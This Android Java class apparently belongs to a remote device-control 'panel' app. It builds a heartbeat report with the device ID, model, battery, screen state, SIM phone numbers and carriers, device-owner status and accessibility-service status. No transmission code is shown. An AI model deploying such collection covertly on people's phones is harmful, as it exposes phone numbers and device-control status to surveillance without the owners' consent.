package com.panellord;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.os.Build;
import android.os.PowerManager;
import android.telephony.TelephonyManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.List;

public class DeviceInfoCollector {

    public static int getBatteryLevel(Context ctx) {
        IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent intent = ctx.registerReceiver(null, filter);
        if (intent == null) return -1;
        int level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
        return scale > 0 ? (int) ((level / (float) scale) * 100) : -1;
    }

    public static JSONArray getSimCards(Context ctx) {
        JSONArray sims = new JSONArray();
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                SubscriptionManager sm = (SubscriptionManager) ctx.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
                List<SubscriptionInfo> list = sm.getActiveSubscriptionInfoList();
                if (list != null) {
                    for (SubscriptionInfo info : list) {
                        JSONObject sim = new JSONObject();
                        sim.put("slotIndex", info.getSimSlotIndex());
                        CharSequence num = info.getNumber();
                        sim.put("number", (num != null && num.length() > 0) ? num.toString() : "Unknown");
                        CharSequence carrier = info.getCarrierName();
                        sim.put("carrier", carrier != null ? carrier.toString() : "Unknown");
                        sims.put(sim);
                    }
                }
            }
        } catch (Exception e) {
            // Permission not granted or unsupported
        }
        if (sims.length() == 0) {
            try {
                JSONObject sim = new JSONObject();
                sim.put("slotIndex", 0);
                sim.put("number", "Unknown");
                sim.put("carrier", "Unknown");
                sims.put(sim);
            } catch (Exception ignored) {}
        }
        return sims;
    }

    public static JSONObject buildHeartbeatBody(Context ctx) {
        JSONObject body = new JSONObject();
        try {
            String deviceId = DeviceIdManager.getDeviceId(ctx);
            body.put("deviceId",       deviceId);
            body.put("brand",          Build.BRAND);
            body.put("model",          Build.MODEL);
            body.put("androidVersion", Build.VERSION.RELEASE);
            body.put("batteryLevel",   getBatteryLevel(ctx));
            body.put("simCards",       getSimCards(ctx));
            body.put("isOnline",       true);
            body.put("isDeviceOwner",  DeviceOwnerHelper.isDeviceOwner(ctx));
            try {
                PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
                body.put("screenOn", pm != null && pm.isInteractive());
            } catch (Exception ignored) {}
            body.put("accessibilityEnabled", PanelAccessibility.isEnabled(ctx));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return body;
    }
}
